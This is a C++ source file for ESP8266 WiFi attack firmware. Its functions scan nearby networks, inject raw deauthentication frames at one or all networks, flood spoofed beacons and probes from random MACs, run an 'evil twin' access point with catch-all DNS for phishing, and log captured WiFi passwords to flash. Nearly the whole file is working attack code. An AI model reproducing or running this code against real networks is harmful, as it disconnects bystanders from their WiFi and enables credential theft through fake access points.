String bytesToStr(const uint8_t* b, uint32_t size) {
  String result = "";
  char hex[4];
  for (uint32_t i = 0; i < size; i++) {
    if (i > 0) result += ":";
    snprintf(hex, sizeof(hex), "%02X", b[i]);
    result += hex;
  }
  return result;
}

void performScan() {
  clearNetworks();
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) return;
  int count = 0;
  int heapLimit = MAX_NETWORKS;
  size_t freeHeap = ESP.getFreeHeap();
  if (freeHeap < HEAP_WARNING_THRESHOLD + 3000) {
    heapLimit = MAX_NETWORKS - 3;
    addLog("Heap-aware scan limited", LOG_WARN);
  } else if (freeHeap < HEAP_WARNING_THRESHOLD + 6000) {
    heapLimit = MAX_NETWORKS - 1;
  }
  for (int i = 0; i < n && count < heapLimit; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;
    if (ESP.getFreeHeap() < HEAP_WARNING_THRESHOLD) {
      addLog("Heap critical during scan, stopping early", LOG_ERR);
      break;
    }
    bool dup = false;
    for (int j = 0; j < count; j++) {
      if (memcmp(WiFi.BSSID(i), networks[j].bssid, MAC_LEN) == 0) {
        if (WiFi.RSSI(i) > networks[j].rssi) {
          networks[j].rssi = WiFi.RSSI(i);
          networks[j].ch = WiFi.channel(i);
        }
        dup = true;
        break;
      }
    }
    if (!dup) {
      networks[count].ssid = ssid;
      networks[count].ch = WiFi.channel(i);
      memcpy(networks[count].bssid, WiFi.BSSID(i), MAC_LEN);
      networks[count].rssi = WiFi.RSSI(i);
      uint8_t enc = WiFi.encryptionType(i);
      networks[count].encrypted = (enc != ENC_TYPE_NONE);
      networks[count].wpa3 = (enc == 8);
      networks[count].pmf = (enc == 8);
      if (networks[count].wpa3) {
        addLog("WPA3 net: " + ssid.substring(0, 16) + " (attack limited)", LOG_WARN);
      }
      networks[count].clients = 0;
      count++;
    }
  }
  WiFi.scanDelete();
  heapPressureEvict();
}

String getVendor(const uint8_t* bssid) {
  char vendor[7];
  sprintf(vendor, "%02X:%02X:%02X", bssid[0], bssid[1], bssid[2]);
  return String(vendor);
}

void sendDeauthToAll() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid.length() > 0) {
      sendDeauth(networks[i].ch, networks[i].bssid, 30);
    }
  }
}

void sendDeauthMulti() {
  for (int i = 0; i < multiTargetCount; i++) {
    sendDeauth(multiTargets[i].ch, multiTargets[i].bssid, 40);
  }
}

void genRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] &= 0xFE; // unicast
  mac[0] |= 0x02; // locally administered
}

void sendPreciseDeauth(uint8_t ch, uint8_t* bssid) {
  uint8_t deauthPkt[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < DEAUTH_BURST_COUNT / 2; i++) {
    wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
    if (i % 10 == 0) yield();
  }
  deauthPkt[0] = 0xA0;
  deauthPkt[4] = bssid[0]; deauthPkt[5] = bssid[1];
  deauthPkt[6] = bssid[2]; deauthPkt[7] = bssid[3];
  deauthPkt[8] = bssid[4]; deauthPkt[9] = bssid[5];
  for (int i = 0; i < DEAUTH_BURST_COUNT / 2; i++) {
    wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
    if (i % 10 == 0) yield();
  }
  deauthPkts += DEAUTH_BURST_COUNT;
  totalPkts += DEAUTH_BURST_COUNT;
}

void sendDeauth(uint8_t ch, uint8_t* bssid, int burstCount = DEAUTH_BURST_COUNT) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < burstCount / 2; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    if (i % 15 == 0) yield();
  }
  deauthPacket[0] = 0xA0;
  deauthPacket[4] = bssid[0]; deauthPacket[5] = bssid[1];
  deauthPacket[6] = bssid[2]; deauthPacket[7] = bssid[3];
  deauthPacket[8] = bssid[4]; deauthPacket[9] = bssid[5];
  for (int i = 0; i < burstCount / 2; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    if (i % 15 == 0) yield();
  }
  deauthPkts += burstCount;
  totalPkts += burstCount;
}

void sendBeacon(uint8_t ch, String ssid, uint8_t* bssid, int burst = BEACON_BURST_COUNT) {
  uint8_t ssidLen = ssid.length();
  if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
  uint8_t beaconPacket[128] = {0};
  beaconPacket[0] = 0x80; beaconPacket[1] = 0x00;
  beaconPacket[2] = 0x00; beaconPacket[3] = 0x00;
  memcpy(&beaconPacket[4], bssid, MAC_LEN);
  memcpy(&beaconPacket[10], bssid, MAC_LEN);
  memcpy(&beaconPacket[16], bssid, MAC_LEN);
  beaconPacket[22] = 0x00; beaconPacket[23] = 0x00;
  beaconPacket[24] = 0x01; beaconPacket[25] = 0x08;
  beaconPacket[26] = 0x02; beaconPacket[27] = 0x04;
  beaconPacket[28] = 0x0B; beaconPacket[29] = 0x16;
  beaconPacket[30] = 0x0C; beaconPacket[31] = 0x12;
  beaconPacket[32] = 0x24; beaconPacket[33] = 0x30;
  beaconPacket[34] = 0x32; beaconPacket[35] = 0x03;
  beaconPacket[36] = 0x48; beaconPacket[37] = 0x60; beaconPacket[38] = 0x6C;
  beaconPacket[39] = 0x00; beaconPacket[40] = ssidLen;
  for (int i = 0; i < ssidLen; i++) beaconPacket[41 + i] = ssid.charAt(i);
  int pktLen = 41 + ssidLen;
  wifi_set_channel(ch);
  for (int i = 0; i < burst; i++) {
    wifi_send_pkt_freedom(beaconPacket, pktLen, 0);
    if (i % 5 == 0) yield();
  }
  beaconPkts += burst;
  totalPkts += burst;
}

void sendProbe(String ssid, int burst = PROBE_BURST_COUNT) {
  uint8_t sLen = ssid.length();
  if (sLen > SSID_MAX_LEN) sLen = SSID_MAX_LEN;
  uint8_t tmpMAC[6];
  genRandomMAC(tmpMAC);
  uint8_t probePacket[60] = {0};
  probePacket[0] = 0x40; probePacket[1] = 0x00;
  probePacket[2] = 0x00; probePacket[3] = 0x00;
  probePacket[4] = 0xFF; probePacket[5] = 0xFF;
  probePacket[6] = 0xFF; probePacket[7] = 0xFF;
  probePacket[8] = 0xFF; probePacket[9] = 0xFF;
  memcpy(&probePacket[10], tmpMAC, 6);
  probePacket[16] = 0xFF; probePacket[17] = 0xFF;
  probePacket[18] = 0xFF; probePacket[19] = 0xFF;
  probePacket[20] = 0xFF; probePacket[21] = 0xFF;
  probePacket[22] = 0x00; probePacket[23] = 0x00;
  probePacket[24] = 0x00; probePacket[25] = sLen;
  for (int i = 0; i < sLen; i++) probePacket[26 + i] = ssid.charAt(i);
  int pktLen = 26 + sLen;
  for (int i = 0; i < burst; i++) {
    wifi_send_pkt_freedom(probePacket, pktLen, 0);
    if (i % 10 == 0) yield();
  }
  probePkts += burst;
  totalPkts += burst;
}

void startEvilTwin(DNSServer* dns, String targetSSID) {
  dns->stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP(targetSSID.c_str(), NULL, 1, 0, 1);
  delay(100);
  dns->start(DNS_PORT, "*", AP_IP);
  hotspotActive = true;
  phishingStep = 0;
}

void stopEvilTwin(DNSServer* dns) {
  dns->stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP(AP_SSID, AP_PASS, 1, 0, 1);
  delay(100);
  dns->start(DNS_PORT, "*", AP_IP);
  hotspotActive = false;
  phishingStep = 0;
}

bool isRateLimited() {
  unsigned long now = millis();
  if (now - lastCaptureTime < CAPTURE_RATE_LIMIT_MS) return true;
  if (now - captureMinStart > 60000) {
    captureCountThisMin = 0;
    captureMinStart = now;
  }
  if (captureCountThisMin >= CAPTURE_MAX_PER_MIN) return true;
  return false;
}

void addCapturedPassword(String ssid, String pwd, String extra = "") {
  if (isRateLimited()) return;
  lastCaptureTime = millis();
  captureCountThisMin++;

  String encryptedPwd = encryptString(pwd);
  if (capturedCount < CAPTURED_MAX) {
    String entry = "SSID:" + ssid + " PASS:" + encryptedPwd;
    if (extra.length() > 0) entry += " (" + extra + ")";
    capturedPasswords[capturedCount] = entry;
    capturedCount++;
  }
  File logFile = LittleFS.open("/log.txt", "a");
  if (logFile) {
    unsigned long t = millis() / 1000;
    char timeStr[24];
    int n = snprintf(timeStr, sizeof(timeStr), "[%lum %lus]", (unsigned long)(t/60), (unsigned long)(t%60));
    if (n < 0 || n >= (int)sizeof(timeStr)) timeStr[sizeof(timeStr)-1] = '\0';
    logFile.println(String(timeStr) + " [CAPTURED] SSID: " + ssid + " -> PASS: " + encryptedPwd + (extra.length() > 0 ? " " + extra : ""));
    logFile.close();
  }
  updateHeapLowMark();
}

void startSessionHijack(uint8_t* bssid, uint8_t ch) {
  hijackActive = true;
  wifi_set_channel(ch);
}

void stopSessionHijack() {
  hijackActive = false;
}

void sendAssocPacket(uint8_t ch, uint8_t* bssid) {
  uint8_t assocPacket[28] = {
    0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom(assocPacket, sizeof(assocPacket), 0);
  }
}

void attackLoop() {
  unsigned long now = millis();

  if (deauthingActive && selectedNetwork.ch > 0 && (now - lastDeauth >= DEAUTH_INTERVAL)) {
    sendDeauth(selectedNetwork.ch, selectedNetwork.bssid, DEAUTH_BURST_COUNT);
    lastDeauth = now;
  }

  if (beaconActive && (now - lastBeacon >= BEACON_INTERVAL)) {
    currentChannel = (currentChannel % CHANNEL_MAX) + 1;
    if (beaconSSIDCount > 0) {
      for (int i = 0; i < beaconSSIDCount && i < 32; i++) {
        uint8_t fakeBSSID[6];
        genRandomMAC(fakeBSSID);
        sendBeacon(currentChannel, beaconSSIDs[i], fakeBSSID, 3);
      }
    } else {
      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (networks[i].ssid.length() > 0) {
          sendBeacon(networks[i].ch, networks[i].ssid, networks[i].bssid, 2);
        }
      }
    }
    lastBeacon = now;
  }

  if (probeActive && (now - lastProbe >= PROBE_INTERVAL)) {
    int sent = 0;
    for (int i = 0; i < MAX_NETWORKS && sent < 5; i++) {
      if (networks[i].ssid.length() > 0) {
        sendProbe(networks[i].ssid, 3);
        sent++;
      }
    }
    if (sent == 0) {
      String randSSID = "AP_" + String(random(1000, 9999));
      sendProbe(randSSID, 5);
    }
    lastProbe = now;
  }

  if (hijackActive && selectedNetwork.ch > 0 && (now - lastHijack >= DEAUTH_INTERVAL)) {
    sendDeauth(selectedNetwork.ch, selectedNetwork.bssid, 30);
    sendAssocPacket(selectedNetwork.ch, selectedNetwork.bssid);
    lastHijack = now;
  }

  if (deauthAllActive && (now - lastDeauthAll >= DEAUTH_INTERVAL * 3)) {
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (networks[i].ssid.length() > 0) {
        sendDeauth(networks[i].ch, networks[i].bssid, 20);
      }
    }
    lastDeauthAll = now;
  }

  if (preciseDeauthActive && selectedNetwork.ch > 0 && (now - lastPreciseDeauth >= DEAUTH_INTERVAL)) {
    sendPreciseDeauth(selectedNetwork.ch, selectedNetwork.bssid);
    lastPreciseDeauth = now;
  }

  if (trueDeauthActive && (now - lastTrueDeauth >= DEAUTH_INTERVAL * 5)) {
    if (!scanning) {
      scanning = true;
      clearNetworks();
      int n = WiFi.scanNetworks(true);
      unsigned long scanStart = millis();
      while (WiFi.scanComplete() < 0 && (millis() - scanStart) < 3000) { yield(); }
      if (WiFi.scanComplete() > 0) {
        n = WiFi.scanComplete();
        int c = 0;
        for (int i = 0; i < n && c < MAX_NETWORKS; i++) {
          String ssid = WiFi.SSID(i);
          if (ssid.length() == 0) continue;
          bool dup = false;
          for (int j = 0; j < c; j++) {
            if (memcmp(WiFi.BSSID(i), networks[j].bssid, MAC_LEN) == 0) {
              if (WiFi.RSSI(i) > networks[j].rssi) { networks[j].rssi = WiFi.RSSI(i); networks[j].ch = WiFi.channel(i); }
              dup = true; break;
            }
          }
          if (!dup) {
            networks[c].ssid = ssid; networks[c].ch = WiFi.channel(i);
            memcpy(networks[c].bssid, WiFi.BSSID(i), MAC_LEN);
            networks[c].rssi = WiFi.RSSI(i);
            networks[c].encrypted = (WiFi.encryptionType(i) != ENC_TYPE_NONE);
            networks[c].clients = 0; c++;
          }
        }
        WiFi.scanDelete();
      }
      scanning = false;
      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (networks[i].ssid.length() > 0) {
          sendDeauth(networks[i].ch, networks[i].bssid, 15);
        }
      }
    }
    lastTrueDeauth = now;
  }
}

String getAttackStatusJSON() {
  String json = "{";
  json += "\"deauth\":" + String(deauthingActive ? "true" : "false") + ",";
  json += "\"beacon\":" + String(beaconActive ? "true" : "false") + ",";
  json += "\"probe\":" + String(probeActive ? "true" : "false") + ",";
  json += "\"eviltwin\":" + String(hotspotActive ? "true" : "false") + ",";
  json += "\"rogueAP\":" + String(rogueAPActive ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"captured\":" + String(capturedCount) + ",";
  json += "\"probes\":" + String(probeCount) + ",";
  json += "\"clients\":" + String(clientCount) + ",";
  json += "\"deauthPkts\":" + String(deauthPkts ? deauthPkts : 0) + ",";
  json += "\"beaconPkts\":" + String(beaconPkts ? beaconPkts : 0) + ",";
  json += "\"probePkts\":" + String(probePkts ? probePkts : 0) + ",";
  json += "\"totalPkts\":" + String(totalPkts ? totalPkts : 0);
  json += "}";
  return json;
}
#endif
